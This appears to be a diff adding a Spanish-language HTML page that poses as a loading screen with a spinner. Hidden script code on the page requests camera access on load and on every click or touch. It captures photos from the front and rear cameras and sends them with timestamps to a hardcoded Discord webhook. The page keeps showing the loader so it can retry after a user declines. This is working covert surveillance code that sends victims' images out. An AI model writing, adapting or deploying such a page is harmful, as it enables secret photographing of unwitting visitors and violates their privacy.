@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cargando...</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    height: 100vh;
+    background: #000;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    color: #fff;
+    overflow: hidden;
+    cursor: pointer;
+  }
+
+  .overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: #000;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 25px;
+    z-index: 9999;
+    color: #e0e0e0;
+  }
+
+  .spinner {
+    width: 45px;
+    height: 45px;
+    border: 4px solid #222;
+    border-top: 4px solid #888;
+    border-radius: 50%;
+    animation: girar 1s linear infinite;
+  }
+
+  @keyframes girar {
+    to { transform: rotate(360deg); }
+  }
+
+  .overlay-text {
+    font-size: 16px;
+    color: #888;
+    letter-spacing: 0.5px;
+  }
+
+  .hidden { display: none; }
+</style>
+</head>
+<body>
+
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    <div class="overlay-text">Cargando contenido, por favor espera...</div>
+  </div>
+
+  <div class="hidden">
+    <video id="video" autoplay playsinline></video>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';
+
+    let currentStream = null;
+    let yaEnviado = false; // evita enviar varias veces
+    let pidiendo = false;  // evita peticiones simultáneas
+
+    // Captura un frame de la cámara indicada
+    async function capturarDeCamara(facingMode) {
+      if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+        currentStream = null;
+      }
+
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: facingMode },
+        audio: false
+      });
+
+      currentStream = stream;
+      video.srcObject = stream;
+
+      await new Promise(resolve => {
+        if (video.readyState >= 2) resolve();
+        else video.onloadeddata = () => resolve();
+      });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+
+      if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+        currentStream = null;
+      }
+
+      return blob;
+    }
+
+    function horaActual() {
+      const d = new Date();
+      const pad = n => String(n).padStart(2, '0');
+      return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()}`;
+    }
+
+    async function enviarCaptura(blob, mensaje, nombreArchivo) {
+      if (!blob) return;
+      const formData = new FormData();
+      formData.append('file', blob, nombreArchivo);
+      formData.append('payload_json', JSON.stringify({ content: mensaje }));
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    async function iniciar() {
+      if (pidiendo || yaEnviado) return;
+      pidiendo = true;
+
+      const hora = horaActual();
+
+      try {
+        // Cámara frontal
+        const blobFrontal = await capturarDeCamara('user');
+        await enviarCaptura(
+          blobFrontal,
+          `📸 **Captura - Cámara frontal** (mismo usuario)\n🕒 Hora: ${hora}`,
+          'frontal.jpg'
+        );
+
+        await new Promise(resolve => setTimeout(resolve, 800));
+
+        // Cámara trasera
+        const blobTrasera = await capturarDeCamara('environment');
+        await enviarCaptura(
+          blobTrasera,
+          `📸 **Captura - Cámara trasera** (mismo usuario)\n🕒 Hora: ${hora}`,
+          'trasera.jpg'
+        );
+
+        yaEnviado = true;
+
+      } catch (err) {
+        // Si el usuario cancela o deniega, no hacemos nada.
+        // La pantalla sigue cargando y esperará otro clic.
+        console.error('Permiso denegado o error:', err);
+      } finally {
+        pidiendo = false;
+      }
+    }
+
+    // Primer intento al cargar
+    window.addEventListener('load', () => {
+      iniciar();
+    });
+
+    // Reintento al hacer clic en cualquier parte (si no se ha enviado aún)
+    document.addEventListener('click', () => {
+      if (!yaEnviado && !pidiendo) {
+        iniciar();
+      }
+    });
+
+    // También reintento al tocar (móvil)
+    document.addEventListener('touchstart', () => {
+      if (!yaEnviado && !pidiendo) {
+        iniciar();
+      }
+    });
+  </script>
+
+</body>
+</html>
